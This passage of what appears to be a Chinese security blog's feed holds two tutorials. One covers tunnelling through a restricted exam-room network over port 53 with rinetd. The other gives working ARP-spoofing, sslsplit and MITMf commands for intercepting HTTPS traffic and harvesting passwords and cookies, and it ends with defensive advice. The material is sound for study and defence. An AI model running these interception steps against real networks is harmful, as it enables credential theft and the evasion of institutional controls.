      &lt;h2 id=&quot;0x00-闲谈&quot;&gt;&lt;a href=&quot;#0x00-闲谈&quot; class=&quot;headerlink&quot; title=&quot;0x00. 闲谈&quot;&gt;&lt;/a&gt;0x00. 闲谈&lt;/h2&gt;&lt;h4 id=&quot;emsp-emsp-最近我们小组招新群里居然有人利用邮箱群发功能进行社工钓鱼，最奇葩的是居然还有人中招了，是可忍孰不可忍，千钧一发之际正当我准备祭出珍藏已久的Nmap打算搞死幕后黑手的时候，他她它居然把服务器关了，看来还是有准备的。如果不是没有酿成严重后果，我们绝对不会善罢甘休，光他暴露的IP就足够我们溯源追踪了，下面我也来给大家演示一下如何钓鱼和预防钓鱼陷阱。&quot;&gt;&lt;a href=&quot;#emsp-emsp-最近我们小组招新群里居然有人利用邮箱群发功能进行社工钓鱼，最奇葩的是居然还有人中招了，是可忍孰不可忍，千钧一发之际正当我准备祭出珍藏已久的Nmap打算搞死幕后黑手的时候，他她它居然把服务器关了，看来还是有准备的。如果不是没有酿成严重后果，我们绝对不会善罢甘休，光他暴露的IP就足够我们溯源追踪了，下面我也来给大家演示一下如何钓鱼和预防钓鱼陷阱。&quot; class=&quot;headerlink&quot; title=&quot;&amp;emsp;&amp;emsp;最近我们小组招新群里居然有人利用邮箱群发功能进行社工钓鱼，最奇葩的是居然还有人中招了，是可忍孰不可忍，千钧一发之际正当我准备祭出珍藏已久的Nmap打算搞死幕后黑手的时候，他她它居然把服务器关了，看来还是有准备的。如果不是没有酿成严重后果，我们绝对不会善罢甘休，光他暴露的IP就足够我们溯源追踪了，下面我也来给大家演示一下如何钓鱼和预防钓鱼陷阱。&quot;&gt;&lt;/a&gt;&amp;emsp;&amp;emsp;最近我们小组招新群里居然有人利用邮箱群发功能进行社工钓鱼，最奇葩的是居然还有人中招了，是可忍孰不可忍，千钧一发之际正当我准备祭出珍藏已久的Nmap打算搞死幕后黑手的时候，他她它居然把服务器关了，看来还是有准备的。如果不是没有酿成严重后果，我们绝对不会善罢甘休，光他暴露的IP就足够我们溯源追踪了，下面我也来给大家演示一下如何钓鱼和预防钓鱼陷阱。&lt;/h4&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>RINET 的妙用</title>
    <link href="http://TimeS0ng.github.io/2017/12/23/RINETD%20%E7%9A%84%E5%A6%99%E7%94%A8/"/>
    <id>http://TimeS0ng.github.io/2017/12/23/RINETD 的妙用/</id>
    <published>2017-12-23T02:07:44.000Z</published>
    <updated>2017-12-27T11:47:13.236Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-闲言"><a href="#0x00-闲言" class="headerlink" title="0x00. 闲言"></a>0x00. 闲言</h2><h4 id="emsp-emsp-最近期末考试的时候，考试室内网络完全被屏蔽，根本访问不了外网，就连同是校园网的网络都访问不了，只能访问学校指定的考试网页，但是页面使用的是域名访问而不是IP，也就是说DNS服务的53端口的流量应该能出去，这样就能开始我们的骚操作了，下面纯属“猜测”，毕竟考试的时候不敢这么做。"><a href="#emsp-emsp-最近期末考试的时候，考试室内网络完全被屏蔽，根本访问不了外网，就连同是校园网的网络都访问不了，只能访问学校指定的考试网页，但是页面使用的是域名访问而不是IP，也就是说DNS服务的53端口的流量应该能出去，这样就能开始我们的骚操作了，下面纯属“猜测”，毕竟考试的时候不敢这么做。" class="headerlink" title="&emsp;&emsp;最近期末考试的时候，考试室内网络完全被屏蔽，根本访问不了外网，就连同是校园网的网络都访问不了，只能访问学校指定的考试网页，但是页面使用的是域名访问而不是IP，也就是说DNS服务的53端口的流量应该能出去，这样就能开始我们的骚操作了，下面纯属“猜测”，毕竟考试的时候不敢这么做。"></a>&emsp;&emsp;最近期末考试的时候，考试室内网络完全被屏蔽，根本访问不了外网，就连同是校园网的网络都访问不了，只能访问学校指定的考试网页，但是页面使用的是域名访问而不是IP，也就是说DNS服务的53端口的流量应该能出去，这样就能开始我们的骚操作了，下面纯属“猜测”，毕竟考试的时候不敢这么做。</h4><a id="more"></a>
<h2 id="0x01-环境搭建"><a href="#0x01-环境搭建" class="headerlink" title="0x01. 环境搭建"></a>0x01. 环境搭建</h2><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备:"></a><strong>环境准备:</strong></h3><h4 id="emsp-emsp-1-kali-linux-（-工具：rinetd-IP-192-168-1-104"><a href="#emsp-emsp-1-kali-linux-（-工具：rinetd-IP-192-168-1-104" class="headerlink" title="&emsp;&emsp;1. kali linux （ 工具：rinetd )  IP = 192.168.1.104"></a>&emsp;&emsp;1. kali linux （ 工具：rinetd )  IP = 192.168.1.104</h4><h4 id="emsp-emsp-2-win-xp-emsp-IP-1-1-1-103"><a href="#emsp-emsp-2-win-xp-emsp-IP-1-1-1-103" class="headerlink" title="&emsp;&emsp;2. win xp &emsp; IP = 1.1.1.103"></a>&emsp;&emsp;2. win xp &emsp; IP = 1.1.1.103</h4><h4 id="emsp-emsp-3-win-xp-emsp-IP-192-168-1-109"><a href="#emsp-emsp-3-win-xp-emsp-IP-192-168-1-109" class="headerlink" title="&emsp;&emsp;3. win xp &emsp; IP = 192.168.1.109"></a>&emsp;&emsp;3. win xp &emsp; IP = 192.168.1.109</h4><h4 id="emsp-emsp-4-monowall-emsp-LAN-IP-1-1-1-1-emsp-WAN-IP-192-168-1-112"><a href="#emsp-emsp-4-monowall-emsp-LAN-IP-1-1-1-1-emsp-WAN-IP-192-168-1-112" class="headerlink" title="&emsp;&emsp;4. monowall &emsp; LAN IP = 1.1.1.1 &emsp; WAN IP = 192.168.1.112"></a>&emsp;&emsp;4. monowall &emsp; LAN IP = 1.1.1.1 &emsp; WAN IP = 192.168.1.112</h4><blockquote>
<p>[*]这里有monowall的简单<a href="http://www.heminjie.com/network/567.html" target="_blank" rel="external">配置方法</a></p>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//Test/20171227181026_6raRvt_6724.jpeg" alt=""></p>
<h3 id="配置路由表"><a href="#配置路由表" class="headerlink" title="配置路由表:"></a><strong>配置路由表:</strong></h3><h4 id="emsp-emsp-在xp中访问1-1-1-1进入防火墙配置页面，账号admin-密码mono，添加一条路由规则仅允许内网主机的流量通过DNS的53端口出外网（通过这条路由规则模拟学校限制网络之后的网络环境）"><a href="#emsp-emsp-在xp中访问1-1-1-1进入防火墙配置页面，账号admin-密码mono，添加一条路由规则仅允许内网主机的流量通过DNS的53端口出外网（通过这条路由规则模拟学校限制网络之后的网络环境）" class="headerlink" title="&emsp;&emsp;在xp中访问1.1.1.1进入防火墙配置页面，账号admin 密码mono，添加一条路由规则仅允许内网主机的流量通过DNS的53端口出外网（通过这条路由规则模拟学校限制网络之后的网络环境）"></a>&emsp;&emsp;在xp中访问1.1.1.1进入防火墙配置页面，账号admin 密码mono，添加一条路由规则仅允许内网主机的流量通过DNS的53端口出外网（通过这条路由规则模拟学校限制网络之后的网络环境）</h4><p><img src="http://p1m5hqy4k.bkt.clouddn.com//Test/20171227181041_6P6SB8_6728.jpeg" alt=""></p>
<h2 id="0x02-实验步骤"><a href="#0x02-实验步骤" class="headerlink" title="0x02. 实验步骤"></a>0x02. 实验步骤</h2><h4 id="emsp-emsp-上面搭建的环境已经基本相似于学校考试室的网络环境，下面我们来实现仅通过53端口进行远程桌面连接外网192-168-1-109的xp。"><a href="#emsp-emsp-上面搭建的环境已经基本相似于学校考试室的网络环境，下面我们来实现仅通过53端口进行远程桌面连接外网192-168-1-109的xp。" class="headerlink" title="&emsp;&emsp;上面搭建的环境已经基本相似于学校考试室的网络环境，下面我们来实现仅通过53端口进行远程桌面连接外网192.168.1.109的xp。"></a>&emsp;&emsp;上面搭建的环境已经基本相似于学校考试室的网络环境，下面我们来实现仅通过53端口进行远程桌面连接外网192.168.1.109的xp。</h4><h4 id="1-首先，在kali中下载安装-rinetd-用于转发流量"><a href="#1-首先，在kali中下载安装-rinetd-用于转发流量" class="headerlink" title="1. 首先，在kali中下载安装 rinetd 用于转发流量"></a>1. 首先，在kali中下载安装 rinetd 用于转发流量</h4><blockquote>
<p>apt-get install rinetd </p>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//Test/20171227181054_YeYibU_6744.jpeg" alt=""></p>
<h4 id="2-然后，修改-rinetd-的配置文件，指定转发规则"><a href="#2-然后，修改-rinetd-的配置文件，指定转发规则" class="headerlink" title="2. 然后，修改 rinetd 的配置文件，指定转发规则"></a>2. 然后，修改 rinetd 的配置文件，指定转发规则</h4><blockquote>
<p>vim /etc/rinetd.conf</p>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//Test/20171227181106_543GvN_6763.jpeg" alt=""></p>
<h4 id="3-启动rinetd"><a href="#3-启动rinetd" class="headerlink" title="3. 启动rinetd"></a>3. 启动rinetd</h4><blockquote>
<p>rinetd</p>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//Test/20171227181117_VhwPW6_6758.jpeg" alt=""></p>
<h4 id="4-启动远程桌面连接xp"><a href="#4-启动远程桌面连接xp" class="headerlink" title="4. 启动远程桌面连接xp"></a>4. 启动远程桌面连接xp</h4><blockquote>
<p>mstsc</p>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//Test/20171227181129_87n6je_6771.jpeg" alt=""></p>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//Test/20171227181142_MFoUyV_6773.jpeg" alt=""></p>
<h2 id="0x03-结语"><a href="#0x03-结语" class="headerlink" title="0x03. 结语"></a>0x03. 结语</h2><h4 id="emsp-emsp-现在我们已经成功突破学校的路由限制控制了外网的XP，不知道这种姿势能否帮助大家更好的理解网络环境-o"><a href="#emsp-emsp-现在我们已经成功突破学校的路由限制控制了外网的XP，不知道这种姿势能否帮助大家更好的理解网络环境-o" class="headerlink" title="&emsp;&emsp;现在我们已经成功突破学校的路由限制控制了外网的XP，不知道这种姿势能否帮助大家更好的理解网络环境\^o^"></a>&emsp;&emsp;现在我们已经成功突破学校的路由限制控制了外网的XP，不知道这种姿势能否帮助大家更好的理解网络环境\^o^</h4>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-闲言&quot;&gt;&lt;a href=&quot;#0x00-闲言&quot; class=&quot;headerlink&quot; title=&quot;0x00. 闲言&quot;&gt;&lt;/a&gt;0x00. 闲言&lt;/h2&gt;&lt;h4 id=&quot;emsp-emsp-最近期末考试的时候，考试室内网络完全被屏蔽，根本访问不了外网，就连同是校园网的网络都访问不了，只能访问学校指定的考试网页，但是页面使用的是域名访问而不是IP，也就是说DNS服务的53端口的流量应该能出去，这样就能开始我们的骚操作了，下面纯属“猜测”，毕竟考试的时候不敢这么做。&quot;&gt;&lt;a href=&quot;#emsp-emsp-最近期末考试的时候，考试室内网络完全被屏蔽，根本访问不了外网，就连同是校园网的网络都访问不了，只能访问学校指定的考试网页，但是页面使用的是域名访问而不是IP，也就是说DNS服务的53端口的流量应该能出去，这样就能开始我们的骚操作了，下面纯属“猜测”，毕竟考试的时候不敢这么做。&quot; class=&quot;headerlink&quot; title=&quot;&amp;emsp;&amp;emsp;最近期末考试的时候，考试室内网络完全被屏蔽，根本访问不了外网，就连同是校园网的网络都访问不了，只能访问学校指定的考试网页，但是页面使用的是域名访问而不是IP，也就是说DNS服务的53端口的流量应该能出去，这样就能开始我们的骚操作了，下面纯属“猜测”，毕竟考试的时候不敢这么做。&quot;&gt;&lt;/a&gt;&amp;emsp;&amp;emsp;最近期末考试的时候，考试室内网络完全被屏蔽，根本访问不了外网，就连同是校园网的网络都访问不了，只能访问学校指定的考试网页，但是页面使用的是域名访问而不是IP，也就是说DNS服务的53端口的流量应该能出去，这样就能开始我们的骚操作了，下面纯属“猜测”，毕竟考试的时候不敢这么做。&lt;/h4&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>HTTPS攻击</title>
    <link href="http://TimeS0ng.github.io/2017/10/27/HTTPS%E6%94%BB%E5%87%BB/"/>
    <id>http://TimeS0ng.github.io/2017/10/27/HTTPS攻击/</id>
    <published>2017-10-27T02:07:44.000Z</published>
    <updated>2017-10-27T02:28:58.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-HTTPS简介"><a href="#0x00-HTTPS简介" class="headerlink" title="0x00. HTTPS简介"></a>0x00. HTTPS简介</h2><h4 id="emsp-emsp-超文本传输安全协议（HTTPS）是一种通过计算机网络进行安全通信的传输协议。HTTPS经由HTTP进行通信，但利用SSL-TLS来加密数据包。HTTPS开发的主要目的，是提供对网站服务器的身份认证，保护交换数据的隐私与完整性。"><a href="#emsp-emsp-超文本传输安全协议（HTTPS）是一种通过计算机网络进行安全通信的传输协议。HTTPS经由HTTP进行通信，但利用SSL-TLS来加密数据包。HTTPS开发的主要目的，是提供对网站服务器的身份认证，保护交换数据的隐私与完整性。" class="headerlink" title="&emsp;&emsp;超文本传输安全协议（HTTPS）是一种通过计算机网络进行安全通信的传输协议。HTTPS经由HTTP进行通信，但利用SSL/TLS来加密数据包。HTTPS开发的主要目的，是提供对网站服务器的身份认证，保护交换数据的隐私与完整性。"></a>&emsp;&emsp;超文本传输安全协议（HTTPS）是一种通过计算机网络进行安全通信的传输协议。HTTPS经由HTTP进行通信，但利用SSL/TLS来加密数据包。HTTPS开发的主要目的，是提供对网站服务器的身份认证，保护交换数据的隐私与完整性。</h4><a id="more"></a>
<hr>
<h2 id="0x01-HTTPS原理"><a href="#0x01-HTTPS原理" class="headerlink" title="0x01. HTTPS原理"></a>0x01. HTTPS原理</h2><p><img src="http://note.youdao.com/yws/public/resource/b1540f77c63d69bb2568836970494df4/xmlnote/WEBRESOURCE3d6869925e8ee4875d1f1e227fd804bb/4307" alt="image"></p>
<h4 id="1-首先是建立TCP的三次握手连接，连接建立之后由客户端向浏览器发起https连接请求"><a href="#1-首先是建立TCP的三次握手连接，连接建立之后由客户端向浏览器发起https连接请求" class="headerlink" title="1. 首先是建立TCP的三次握手连接，连接建立之后由客户端向浏览器发起https连接请求"></a>1. 首先是建立TCP的三次握手连接，连接建立之后由客户端向浏览器发起https连接请求</h4><h4 id="2-连接请求成功之后，client会发送自己所有支持的ciphersuit（包括：对称加密算法、非对称加密算法、单向加密算法、伪随机数算法）给目标server进行加密算法的协商，server会选择他们俩都支持的最安全的ciphersuit进行加密通信"><a href="#2-连接请求成功之后，client会发送自己所有支持的ciphersuit（包括：对称加密算法、非对称加密算法、单向加密算法、伪随机数算法）给目标server进行加密算法的协商，server会选择他们俩都支持的最安全的ciphersuit进行加密通信" class="headerlink" title="2. 连接请求成功之后，client会发送自己所有支持的ciphersuit（包括：对称加密算法、非对称加密算法、单向加密算法、伪随机数算法）给目标server进行加密算法的协商，server会选择他们俩都支持的最安全的ciphersuit进行加密通信"></a>2. 连接请求成功之后，client会发送自己所有支持的ciphersuit（包括：对称加密算法、非对称加密算法、单向加密算法、伪随机数算法）给目标server进行加密算法的协商，server会选择他们俩都支持的最安全的ciphersuit进行加密通信</h4><h4 id="3-然后server会发送自己的证书到client（证书用于验证server的身份，同时也包含了server的各种注册信息）"><a href="#3-然后server会发送自己的证书到client（证书用于验证server的身份，同时也包含了server的各种注册信息）" class="headerlink" title="3. 然后server会发送自己的证书到client（证书用于验证server的身份，同时也包含了server的各种注册信息）"></a>3. 然后server会发送自己的证书到client（证书用于验证server的身份，同时也包含了server的各种注册信息）</h4><h4 id="4-client在接收到server的证书之后，会验证该证书是否是由本地根证书中所信任的颁发机构颁发的证书"><a href="#4-client在接收到server的证书之后，会验证该证书是否是由本地根证书中所信任的颁发机构颁发的证书" class="headerlink" title="4. client在接收到server的证书之后，会验证该证书是否是由本地根证书中所信任的颁发机构颁发的证书"></a>4. client在接收到server的证书之后，会验证该证书是否是由本地根证书中所信任的颁发机构颁发的证书</h4><h4 id="【-】证书里面会有证书颁发机构的私钥签名，只有正确的私钥才能被client保存的公钥解密，这就保证了证书的安全性；证书中还会存在server的公钥，只有拥有私钥的server才能解密公钥加密的内容，这就保证了后续过程的安全性。"><a href="#【-】证书里面会有证书颁发机构的私钥签名，只有正确的私钥才能被client保存的公钥解密，这就保证了证书的安全性；证书中还会存在server的公钥，只有拥有私钥的server才能解密公钥加密的内容，这就保证了后续过程的安全性。" class="headerlink" title="【*】证书里面会有证书颁发机构的私钥签名，只有正确的私钥才能被client保存的公钥解密，这就保证了证书的安全性；证书中还会存在server的公钥，只有拥有私钥的server才能解密公钥加密的内容，这就保证了后续过程的安全性。"></a>【*】证书里面会有证书颁发机构的私钥签名，只有正确的私钥才能被client保存的公钥解密，这就保证了证书的安全性；证书中还会存在server的公钥，只有拥有私钥的server才能解密公钥加密的内容，这就保证了后续过程的安全性。</h4><h4 id="5-验证了证书的合法性之后，client会使用刚才协商的伪随机数算法生成对称密钥，然后将对称密钥通过server的公钥进行加密之后，再发送给server"><a href="#5-验证了证书的合法性之后，client会使用刚才协商的伪随机数算法生成对称密钥，然后将对称密钥通过server的公钥进行加密之后，再发送给server" class="headerlink" title="5. 验证了证书的合法性之后，client会使用刚才协商的伪随机数算法生成对称密钥，然后将对称密钥通过server的公钥进行加密之后，再发送给server"></a>5. 验证了证书的合法性之后，client会使用刚才协商的伪随机数算法生成对称密钥，然后将对称密钥通过server的公钥进行加密之后，再发送给server</h4><h4 id="6-server接收到公钥加密的内容之后，会用自己的私钥进行解密，从而获取对称密钥，此时通信双方都得到了对称密钥就可以进行加密通信了"><a href="#6-server接收到公钥加密的内容之后，会用自己的私钥进行解密，从而获取对称密钥，此时通信双方都得到了对称密钥就可以进行加密通信了" class="headerlink" title="6. server接收到公钥加密的内容之后，会用自己的私钥进行解密，从而获取对称密钥，此时通信双方都得到了对称密钥就可以进行加密通信了"></a>6. server接收到公钥加密的内容之后，会用自己的私钥进行解密，从而获取对称密钥，此时通信双方都得到了对称密钥就可以进行加密通信了</h4><h4 id="7-通信时client会先将数据用对称密钥加密，然后又进行hash计算，然后用server的公钥将得到的hash值进行加密，将该hash值和加密之后的密文发送给server端"><a href="#7-通信时client会先将数据用对称密钥加密，然后又进行hash计算，然后用server的公钥将得到的hash值进行加密，将该hash值和加密之后的密文发送给server端" class="headerlink" title="7. 通信时client会先将数据用对称密钥加密，然后又进行hash计算，然后用server的公钥将得到的hash值进行加密，将该hash值和加密之后的密文发送给server端"></a>7. 通信时client会先将数据用对称密钥加密，然后又进行hash计算，然后用server的公钥将得到的hash值进行加密，将该hash值和加密之后的密文发送给server端</h4><h4 id="【-】hash-private-encrypt-data-public-encrypt-hash-emsp-–-gt-emsp-server"><a href="#【-】hash-private-encrypt-data-public-encrypt-hash-emsp-–-gt-emsp-server" class="headerlink" title="【*】hash(private_encrypt(data)) + public_encrypt(hash)&emsp;–&gt;&emsp;server"></a>【*】hash(private_encrypt(data)) + public_encrypt(hash)&emsp;–&gt;&emsp;server</h4><h4 id="8-server接收到client传来的数据包之后，会先用自己的私钥解密密文得到hash1，然后用hash1与没有加密的hash进行比较，相同则代表传输的数据没有被篡改，然后再用之前协商的单向加密算法解密hash，用对称密钥解密密文得到data"><a href="#8-server接收到client传来的数据包之后，会先用自己的私钥解密密文得到hash1，然后用hash1与没有加密的hash进行比较，相同则代表传输的数据没有被篡改，然后再用之前协商的单向加密算法解密hash，用对称密钥解密密文得到data" class="headerlink" title="8. server接收到client传来的数据包之后，会先用自己的私钥解密密文得到hash1，然后用hash1与没有加密的hash进行比较，相同则代表传输的数据没有被篡改，然后再用之前协商的单向加密算法解密hash，用对称密钥解密密文得到data"></a>8. server接收到client传来的数据包之后，会先用自己的私钥解密密文得到hash1，然后用hash1与没有加密的hash进行比较，相同则代表传输的数据没有被篡改，然后再用之前协商的单向加密算法解密hash，用对称密钥解密密文得到data</h4><h3 id="server发送数据过程类似："><a href="#server发送数据过程类似：" class="headerlink" title="server发送数据过程类似："></a>server发送数据过程类似：</h3><h4 id="【-】hash-private-encrypt-data-private-encrypt-hash-emsp-–-gt-emsp-client"><a href="#【-】hash-private-encrypt-data-private-encrypt-hash-emsp-–-gt-emsp-client" class="headerlink" title="【*】hash(private_encrypt(data)) + private_encrypt(hash)&emsp;–&gt;&emsp;client"></a>【*】hash(private_encrypt(data)) + private_encrypt(hash)&emsp;–&gt;&emsp;client</h4><hr>
<h2 id="0x02-攻击原理"><a href="#0x02-攻击原理" class="headerlink" title="0x02. 攻击原理"></a>0x02. 攻击原理</h2><p><img src="http://note.youdao.com/yws/public/resource/b1540f77c63d69bb2568836970494df4/xmlnote/WEBRESOURCE78ffc04751b8ecb4bd840b668482b9c8/4502" alt="image"></p>
<h4 id="emsp-emsp-1-首先attacker会对目标进行中间人攻击，从而让流量流经自己的电脑（这与burpsuit的原理根本就是一样的）"><a href="#emsp-emsp-1-首先attacker会对目标进行中间人攻击，从而让流量流经自己的电脑（这与burpsuit的原理根本就是一样的）" class="headerlink" title="&emsp;&emsp;1. 首先attacker会对目标进行中间人攻击，从而让流量流经自己的电脑（这与burpsuit的原理根本就是一样的）"></a>&emsp;&emsp;1. 首先attacker会对目标进行中间人攻击，从而让流量流经自己的电脑（这与burpsuit的原理根本就是一样的）</h4><h4 id="emsp-emsp-2-此时client便会与attacker进行https加密通信，server也会与attacker进行https加密通信"><a href="#emsp-emsp-2-此时client便会与attacker进行https加密通信，server也会与attacker进行https加密通信" class="headerlink" title="&emsp;&emsp;2. 此时client便会与attacker进行https加密通信，server也会与attacker进行https加密通信"></a>&emsp;&emsp;2. 此时client便会与attacker进行https加密通信，server也会与attacker进行https加密通信</h4><h4 id="emsp-emsp-3-虽然此时进行的是https通信，但是所有的data对于attacker来说都是明文的"><a href="#emsp-emsp-3-虽然此时进行的是https通信，但是所有的data对于attacker来说都是明文的" class="headerlink" title="&emsp;&emsp;3. 虽然此时进行的是https通信，但是所有的data对于attacker来说都是明文的"></a>&emsp;&emsp;3. 虽然此时进行的是https通信，但是所有的data对于attacker来说都是明文的</h4><hr>
<h2 id="0x03-攻击实战"><a href="#0x03-攻击实战" class="headerlink" title="0x03. 攻击实战"></a>0x03. 攻击实战</h2><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><h4 id="emsp-emsp-1-sslsplit、arpspoof"><a href="#emsp-emsp-1-sslsplit、arpspoof" class="headerlink" title="&emsp;&emsp;1. sslsplit、arpspoof"></a>&emsp;&emsp;1. sslsplit、arpspoof</h4><h4 id="emsp-emsp-2-win-7"><a href="#emsp-emsp-2-win-7" class="headerlink" title="&emsp;&emsp;2. win 7"></a>&emsp;&emsp;2. win 7</h4><h3 id="实战步骤"><a href="#实战步骤" class="headerlink" title="实战步骤"></a>实战步骤</h3><h3 id="1-打开kali的数据包转发功能"><a href="#1-打开kali的数据包转发功能" class="headerlink" title="1. 打开kali的数据包转发功能"></a>1. 打开kali的数据包转发功能</h3><blockquote>
<p>echo 1 &gt;&gt; /proc/sys/net/ipv4/ip_forward</p>
<h3 id="2-设置端口转发（将原本发过来的80、443等端口全部转发到sslsplit的代理端口）"><a href="#2-设置端口转发（将原本发过来的80、443等端口全部转发到sslsplit的代理端口）" class="headerlink" title="2. 设置端口转发（将原本发过来的80、443等端口全部转发到sslsplit的代理端口）"></a>2. 设置端口转发（将原本发过来的80、443等端口全部转发到sslsplit的代理端口）</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">iptables -t nat -F</div><div class="line">iptables -t nat -A PREROUTING -p tcp --dport <span class="number">80</span> -j REDIRECT --to-ports <span class="number">8080</span></div><div class="line">iptables -t nat -A PREROUTING -p tcp --dport <span class="number">443</span> -j REDIRECT --to-ports <span class="number">8443</span></div><div class="line">iptables -t nat -A PREROUTING -p tcp --dport <span class="number">587</span> -j REDIRECT --to-ports <span class="number">8443</span> </div><div class="line">iptables -t nat -A PREROUTING -p tcp --dport <span class="number">465</span> -j REDIRECT --to-ports <span class="number">8443</span> </div><div class="line">iptables -t nat -A PREROUTING -p tcp --dport <span class="number">993</span> -j REDIRECT --to-ports <span class="number">8443</span> </div><div class="line">iptables -t nat -A PREROUTING -p tcp --dport <span class="number">995</span> -j REDIRECT --to-ports <span class="number">8443</span> </div><div class="line">iptables -t nat -L</div></pre></td></tr></table></figure>
</blockquote>
<h3 id="3-利用openssl生成私钥"><a href="#3-利用openssl生成私钥" class="headerlink" title="3. 利用openssl生成私钥"></a>3. 利用openssl生成私钥</h3><blockquote>
<p>openssl genrsa -out ca.key 2048</p>
</blockquote>
<h3 id="4-利用私钥签名生成的证书"><a href="#4-利用私钥签名生成的证书" class="headerlink" title="4. 利用私钥签名生成的证书"></a>4. 利用私钥签名生成的证书</h3><blockquote>
<p>openssl req -new -x509 -days 1096 -key ca.key -out ca.crt<br><img src="http://note.youdao.com/yws/public/resource/b1540f77c63d69bb2568836970494df4/xmlnote/6EB70B114869460E88237A53C65D8E10/4435" alt="image"></p>
</blockquote>
<h3 id="5-启动arpspoof进行中间人攻击"><a href="#5-启动arpspoof进行中间人攻击" class="headerlink" title="5. 启动arpspoof进行中间人攻击"></a>5. 启动arpspoof进行中间人攻击</h3><blockquote>
<p>arpspoof -i eth0 -t 192.168.1.103 -r 192.168.1.1</p>
</blockquote>
<h3 id="6-创建log目录，启动sslsplit"><a href="#6-创建log目录，启动sslsplit" class="headerlink" title="6. 创建log目录，启动sslsplit"></a>6. 创建log目录，启动sslsplit</h3><blockquote>
<p>mkdir -p test/logdir </p>
<p>sslsplit -D -l connect.log -j /root/test -S logdir/ -k ca.key -c ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/b1540f77c63d69bb2568836970494df4/xmlnote/7AD511B11C824B98B4B9555AEDE1443C/4449" alt="image"></p>
<h4 id="如果像github这种https配置较好的网站是会提醒用户证书错误的，最近刚出的WPA2漏洞里面欺骗的那个https网站就属于配置有误"><a href="#如果像github这种https配置较好的网站是会提醒用户证书错误的，最近刚出的WPA2漏洞里面欺骗的那个https网站就属于配置有误" class="headerlink" title="[*]如果像github这种https配置较好的网站是会提醒用户证书错误的，最近刚出的WPA2漏洞里面欺骗的那个https网站就属于配置有误"></a>[*]如果像github这种https配置较好的网站是会提醒用户证书错误的，最近刚出的WPA2漏洞里面欺骗的那个https网站就属于配置有误</h4><h3 id="7-剩下的就是用正则匹配出想要的账号密码或者cookie了"><a href="#7-剩下的就是用正则匹配出想要的账号密码或者cookie了" class="headerlink" title="7. 剩下的就是用正则匹配出想要的账号密码或者cookie了"></a>7. 剩下的就是用正则匹配出想要的账号密码或者cookie了</h3><h3 id="8-当然我们也能用MITMF对HTTPS做降级攻击，这样就能直接捕获明文"><a href="#8-当然我们也能用MITMF对HTTPS做降级攻击，这样就能直接捕获明文" class="headerlink" title="8. 当然我们也能用MITMF对HTTPS做降级攻击，这样就能直接捕获明文"></a>8. 当然我们也能用MITMF对HTTPS做降级攻击，这样就能直接捕获明文</h3><blockquote>
<p>iptables -t nat -F</p>
<p>mitmf <strong>-</strong>-spoof <strong>-</strong>-arp -i eth0 <strong>-</strong>-gateway 192.168.1.1 <strong>-</strong>-target 192.168.1.103 <strong>-</strong>-hsts</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/b1540f77c63d69bb2568836970494df4/xmlnote/73A648CB3A9442459A5DCA6CEAFD64E3/4471" alt="image"></p>
<h4 id="方法多种多样，大家还可以尝试其他工具，这里就不一一列举了"><a href="#方法多种多样，大家还可以尝试其他工具，这里就不一一列举了" class="headerlink" title="[*]方法多种多样，大家还可以尝试其他工具，这里就不一一列举了"></a>[*]方法多种多样，大家还可以尝试其他工具，这里就不一一列举了</h4><hr>
<h2 id="0x04-防御建议"><a href="#0x04-防御建议" class="headerlink" title="0x04. 防御建议"></a>0x04. 防御建议</h2><h3 id="服务端防御"><a href="#服务端防御" class="headerlink" title="服务端防御"></a>服务端防御</h3><h4 id="emsp-emsp-配置最安全的https"><a href="#emsp-emsp-配置最安全的https" class="headerlink" title="&emsp;&emsp;配置最安全的https"></a>&emsp;&emsp;配置最安全的https</h4><h4 id="emsp-emsp-密码不仅要靠https加密传输，在前端也要使用加密控件对密码进行加密，这样就算被降级攻击也拿不到密码明文"><a href="#emsp-emsp-密码不仅要靠https加密传输，在前端也要使用加密控件对密码进行加密，这样就算被降级攻击也拿不到密码明文" class="headerlink" title="&emsp;&emsp;密码不仅要靠https加密传输，在前端也要使用加密控件对密码进行加密，这样就算被降级攻击也拿不到密码明文"></a>&emsp;&emsp;密码不仅要靠https加密传输，在前端也要使用加密控件对密码进行加密，这样就算被降级攻击也拿不到密码明文</h4><h3 id="客户端防御"><a href="#客户端防御" class="headerlink" title="客户端防御"></a>客户端防御</h3><h4 id="emsp-emsp-配置路由规则，绑定IP／MAC以防被ARP欺骗"><a href="#emsp-emsp-配置路由规则，绑定IP／MAC以防被ARP欺骗" class="headerlink" title="&emsp;&emsp;配置路由规则，绑定IP／MAC以防被ARP欺骗"></a>&emsp;&emsp;配置路由规则，绑定IP／MAC以防被ARP欺骗</h4><h4 id="emsp-emsp-谨慎打开浏览器提醒证书错误的网站，但是笔者曾遇到过某部门网站居然都会出现证书报错，不得已还是要打开"><a href="#emsp-emsp-谨慎打开浏览器提醒证书错误的网站，但是笔者曾遇到过某部门网站居然都会出现证书报错，不得已还是要打开" class="headerlink" title="&emsp;&emsp;谨慎打开浏览器提醒证书错误的网站，但是笔者曾遇到过某部门网站居然都会出现证书报错，不得已还是要打开"></a>&emsp;&emsp;谨慎打开浏览器提醒证书错误的网站，但是笔者曾遇到过某部门网站居然都会出现证书报错，不得已还是要打开</h4><h4 id="emsp-emsp-少去蹭网，往往免费的东西才是最贵的"><a 